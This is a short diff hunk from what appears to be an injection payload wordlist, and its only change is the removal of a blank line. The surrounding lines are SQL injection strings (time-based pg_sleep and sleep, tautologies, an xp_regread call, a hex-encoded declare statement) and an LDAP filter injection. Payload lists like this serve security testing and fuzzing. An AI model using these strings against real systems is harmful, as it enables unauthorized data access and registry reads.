@@ -11,7 +11,6 @@ pg_sleep(__TIME__)--
 *(|(objectclass=*))
 declare @q nvarchar (200) 0x730065006c00650063 ...
  or 0=0 #
-
 1) or sleep(__TIME__)#
 ) or ('a'='a
 ; exec xp_regread
